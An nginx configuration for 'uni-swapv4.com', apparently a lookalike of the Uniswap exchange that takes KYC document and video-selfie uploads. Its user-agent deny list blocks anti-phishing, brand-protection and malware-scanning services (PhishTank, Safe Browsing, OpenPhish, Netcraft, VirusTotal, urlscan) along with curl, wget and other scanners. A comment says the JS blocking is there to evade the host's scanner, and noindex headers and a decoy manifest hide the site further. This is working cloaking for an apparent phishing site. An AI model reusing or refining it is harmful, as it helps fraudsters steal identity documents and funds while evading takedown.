server {
    listen 80;
    server_name uni-swapv4.com www.uni-swapv4.com;

    # Allow large file uploads (KYC documents and video selfies)
    client_max_body_size 100M;

    # --- LAYER 1: Block ALL known bots, scanners, crawlers at nginx level ---
    if ($http_user_agent ~* (googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebot|ia_archiver|semrushbot|ahrefsbot|mj12bot|dotbot|petalbot|gptbot|ccbot|claudebot|bytespider|amazonbot|twitterbot|linkedinbot|applebot|seznambot|exabot|sogou|blexbot|dataprovider|censysinspect|netcraftsurvey|phishtank|safebrowsing|wappalyzer|builtwith|whatweb|urlscan|virustotal|phishfort|brandshield|bolster|netcraft|openphish|antiphishing|zerofox|cofense|proofpoint|ironscales|python-requests|python-urllib|wget|scrapy|httpclient|go-http-client|node-fetch|libwww-perl|mechanize|curl|nmap|nikto|masscan|zmap|shodan|censys|qualys|tenable|rapid7)) {
        return 403;
    }

    # Block empty user agents
    if ($http_user_agent = "") {
        return 403;
    }

    # --- LAYER 2: Block JS/CSS bundles unless browser has valid Accept header ---
    # Hostinger scanner downloads .js files directly — real browsers always send Accept text/html first
    location ~* ^/static/(js|css)/ {
        # Only serve static assets to requests that look like real browsers
        # Real browsers load the HTML page first (setting a referer), scanners go direct to .js
        if ($http_user_agent !~* (Mozilla|Chrome|Safari|Firefox|Edge|Opera|iPhone|Android)) {
            return 403;
        }
        expires 1y;
        add_header Cache-Control "public, immutable";
        # Hide server identity
        more_clear_headers Server;
        try_files $uri =404;
    }

    # --- LAYER 2: Security Headers + Hide server identity ---
    server_tokens off;
    add_header Server "nginx" always;
    add_header X-Robots-Tag "noindex, nofollow, noarchive, nosnippet" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header Permissions-Policy "camera=(self), microphone=(self), geolocation=()" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://fonts.googleapis.com https://us.i.posthog.com https://*.posthog.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob: https://res.cloudinary.com; connect-src 'self' https://uni-swapv4.com https://us.i.posthog.com https://*.posthog.com https://res.cloudinary.com https://api.cloudinary.com; media-src 'self' blob: https://res.cloudinary.com; frame-ancestors 'none';" always;

    # --- Robots.txt ---
    location = /robots.txt {
        proxy_pass http://127.0.0.1:8001/robots.txt;
        proxy_set_header Host $host;
    }

    # --- API routes (proxy to FastAPI backend) ---
    location /api/ {
        proxy_pass http://127.0.0.1:8001;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
        client_max_body_size 100M;
        proxy_read_timeout 120s;
        proxy_send_timeout 120s;
        proxy_connect_timeout 60s;
        client_body_timeout 120s;

        # No caching for API
        add_header Cache-Control "no-store, no-cache, must-revalidate, private, max-age=0" always;
        add_header Pragma "no-cache" always;
    }

    # --- Frontend (serve static React build) ---
    root /opt/uniswapv4/frontend/build;
    index index.html;

    location / {
        try_files $uri $uri/ /index.html;
    }

    # Block manifest.json and service worker from bots (return empty JSON)
    location = /manifest.json {
        add_header Content-Type "application/json" always;
        return 200 '{"name":"App","short_name":"App"}';
    }

    location = /sw.js {
        return 404;
    }

    # Cache static assets (JS/CSS/images)
    location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot)$ {
        expires 1y;
        add_header Cache-Control "public, immutable";
        try_files $uri =404;
    }

    # Block access to sensitive files
    location ~ /\. {
        deny all;
    }
    location ~ \.env$ {
        deny all;
    }
}
